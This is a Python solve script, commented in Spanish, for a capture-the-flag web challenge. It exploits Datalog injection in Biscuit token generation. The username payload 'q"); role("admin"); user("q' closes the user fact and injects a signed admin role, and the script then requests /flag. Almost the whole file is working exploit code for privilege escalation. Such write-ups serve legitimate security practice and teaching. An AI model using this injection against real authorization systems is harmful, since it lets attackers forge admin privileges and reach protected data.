#!/usr/bin/env python3
"""
gaslightCTF 2026 - biscuit (The Jaffa Cake Zone) - Web
Explota una inyeccion de Datalog en la generacion del Biscuit token.

El username se interpola crudo dentro del bloque authority del token en mint():
    user("{username}"); ...
Registrando un usuario con el payload de abajo se cierra el fact user(...) y se
inyecta un fact role("admin") propio, que queda firmado con la clave root y por
lo tanto es confiable para el autorizador de /flag.

Uso:
    python3 solve.py https://TARGET
    (si no se pasa argumento, usa la constante TARGET de abajo)
"""

import re
import sys
import requests

TARGET = "http://localhost:8080"  # reemplazar por la URL de la instancia

# Payload: cierra user("q"), inyecta role("admin") y reabre user("q")
PAYLOAD_USERNAME = 'q"); role("admin"); user("q'
PASSWORD = "x"

# El reto menciona que los agentes registrados deben mandar este header.
HEADERS = {"X-LLM-Agent": "manual"}

FLAG_RE = re.compile(r"gaslightCTF\{[\w\-_!?]+\}")


def solve(target: str) -> str:
    s = requests.Session()
    s.headers.update(HEADERS)

    # 1) Registro: el server responde seteando la cookie 'biscuit' ya firmada
    #    con el fact role("admin") inyectado.
    s.post(
        f"{target}/signup",
        data={"username": PAYLOAD_USERNAME, "password": PASSWORD},
        allow_redirects=True,
        verify=False,
    )

    # 2) Con esa cookie, /flag pasa el check de admin y devuelve la flag.
    r = s.get(f"{target}/flag", verify=False)

    m = FLAG_RE.search(r.text)
    if not m:
        raise RuntimeError(
            "No se encontro la flag en la respuesta. "
            f"Status={r.status_code}. Revisar el TARGET y la cookie 'biscuit'."
        )
    return m.group(0)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else TARGET
    target = target.rstrip("/")
    print(f"[+] Target: {target}")
    flag = solve(target)
    print("[+] Flag:", flag)
